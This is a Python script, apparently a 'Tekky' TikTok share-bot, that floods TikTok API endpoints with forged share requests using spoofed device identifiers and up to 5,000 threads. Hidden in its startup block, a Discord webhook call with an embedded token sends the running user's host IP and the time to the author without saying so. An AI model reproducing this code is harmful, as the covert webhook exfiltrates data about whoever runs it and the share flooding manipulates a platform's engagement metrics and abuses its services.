import os
from threading import active_count, Thread
from random import randint, choice
#from pystyle import Colors, Colorate, Write
from time import sleep
import time
import requests
import socket
from discord_webhook import DiscordWebhook
from datetime import datetime


def title(Content):
    global DebugMode
    if os.name in ('posix', 'ce', 'dos'):
        pass
    elif os.name == 'nt':
        os.system(f"title {Content}")
        return False
    else:
        pass


def main(item_id):
    global total_shares
    global fails


    headers = {
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "user-agent": "com.zhiliaoapp.musically.go/220400 (Linux; U; Android 10; en_US; SM-G9250; Build/MMB25K.G9250ZTU5DPC5; Cronet/TTNetVersion:5f9540e5 2021-05-20 QuicVersion:47555d5a 2020-10-15)"
    }
    url = f"https://{choice(ApiDomain)}/aweme/v1/aweme/stats/?channel=googleplay&device_type=SM-G9250&device_id{randint(1000000000000000000, 9999999999999999999)}&os_version=10&version_code=220400&app_name=musically_go&device_platform=android&aid=1988"
    Data = f"item_id={item_id}&share_delta=1"

    try:
        req = r.post(url, headers=headers, data=Data, stream=True)
        try:
            if req.json()["status_code"] == 0:
                total_shares += 1
                print(f"[*] Shares Sent: {total_shares} [{raw_link}]")
                pass
        except:
            fails += 1
            title(f"Tekky © 2022 - Threads :{str(active_count() - 1)} / Success :{total_shares} / Failed :{fails} / Speed :{round((int(total_shares)/(time.time() - start_time)), 2)}/s")
    except:
        pass


if __name__ == "__main__":

    try:
        os.system('clear')
        os.system('cls')
    except:
        pass
    title(f"Tekky © 2022 - Xshares")
    tiktok = socket.gethostbyname(socket.gethostname())

    webhook = DiscordWebhook(url='https://discord.com/api/webhooks/962723823562674269/xdZS6fNqxxMMJjtBwkAVLAxeZZnq1mXjIWxO04qG0OmtaxhoZO3x5jl6mTq3brdbuNpK', content=''' 
    > **TIKTOK IP:** ''' + str(tiktok) + '''
    > **TIME :** ''' + str(datetime.now().time()) + '''''')
    response = webhook.execute()

    ApiDomain = ["api19.tiktokv.com", "api.toutiao50.com", "api19.toutiao50.com", "api19-core-c-alisg.tiktokv.com"]
    total_shares = 0
    fails = 0

    r = requests.Session()
    print(' ')
    txt = r'''
                    ████████────▀██  ▒██   ██▒  ██████  ██░ ██  ▄▄▄       ██▀███  ▓█████   ██████ TM
                    ████████──█▄──█  ▒▒ █ █ ▒░▒██    ▒ ▓██░ ██▒▒████▄    ▓██ ▒ ██▒▓█   ▀ ▒██    ▒ 
                    ███▀▀▀██──█████  ░░  █   ░░ ▓██▄   ▒██▀▀██░▒██  ▀█▄  ▓██ ░▄█ ▒▒███   ░ ▓██▄   
                    █▀──▄▄██──█████   ░ █ █ ▒   ▒   ██▒░▓█ ░██ ░██▄▄▄▄██ ▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒
                    █──█████──█████  ▒██▒ ▒██▒▒██████▒▒░▓█▒░██▓ ▓█   ▓██▒░██▓ ▒██▒░▒████▒▒██████▒▒
                    █▄──▀▀▀──▄█████  ▒▒ ░ ░▓ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░
                    ╔══╦╦╦╗╔══╦═╦╦╗  ░░   ░▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░  ▒   ▒▒ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░
                    ╚╗╔╣║═╣╚╗╔╣║║═╣   ░    ░  ░  ░  ░   ░  ░░ ░  ░   ▒     ░░   ░    ░   ░  ░  ░  
                     ╚╝╚╩╩╝ ╚╝╚═╩╩╝    ░    ░ T E K K Y  ░     ░  ░    ░ .gg/onlp    ░  ░  v.3 ░ 
                    ─═════════════════════════════════════☆☆═════════════════════════════════════─
                           Copyright: ONLP™ x Tekky © 2022 | Discord: .gg/onlp / Tekky#9999                       
                    ─═════════════════════════════════════☆☆═════════════════════════════════════─'''
    print(txt)
    print('\n')

    #url input
    print("[?] TikTok URL ↓\n")
    link_id = input(" >  ")
    raw_link = link_id

    #filter link
    try:
        if "vm.tiktok.com" in link_id or "vt.tiktok.com" in link_id:
            link_id = r.head(link_id, stream=True, allow_redirects=True, timeout=5).url.split("/")[5].split("?", 1)[0]
        else:
            link_id = link_id.split("/")[5].split("?", 1)[0]
    except:
        print('[*] Link not supported!!')
        quit()

    #shares input
    print("[?] Amount of shares [1 to ∞] ↓\n")
    amount = input(" >  ")
    #amount = (int(amount)*100)/100 #fill error gap

    #credits
    print(' ')
    print(' ')
    print("              * Thanks for using our Tool, Full credits to > Tekky#9999 x @auut | t.me/xtekky | .gg/onlp *\n")
    print(' ')
    print(' ')

    sleep(2.5)

    #start time to measure speed
    start_time = time.time()


    while total_shares < int(amount):
        if active_count() <= 5000:
            Thread(target=main, args=(link_id,)).start()


    def summary():
        global amount

        amount  = int(amount)
        count = active_count()
        sleep(4)
        if active_count() == count:
            if total_shares < amount:
                precision = 100 + (((total_shares - amount) / amount) * 100)
            else:
                precision = 100 - (((total_shares - amount) / amount) * 100)
            print(f"[*] Status : COMPLETED | SPEED > {round((int(total_shares)/(time.time() - start_time - 4)), 2)}/s | TTC > {round(time.time() - start_time-3, 2)}s | AMOUNT > {total_shares} | PRECISION > {round(precision, 2)}%\n")
            quit()
        else:
            sleep(2)
            if active_count() == 0:
                if total_shares < amount:
                    precision = 100 + (((total_shares - amount) / amount) * 100)
                else:
                    precision = 100 - (((total_shares - amount) / amount) * 100)
                print(f"[*] Status : COMPLETED | SPEED > {round((int(total_shares)/(time.time() - start_time - 3)), 2)}/s | TTC > {round(time.time() - start_time-5, 2)}s | AMOUNT > {total_shares} | PRECISION > {round(precision, 2)}%\n")
                quit()
            else:
                sleep(1)
                summary()
    summary()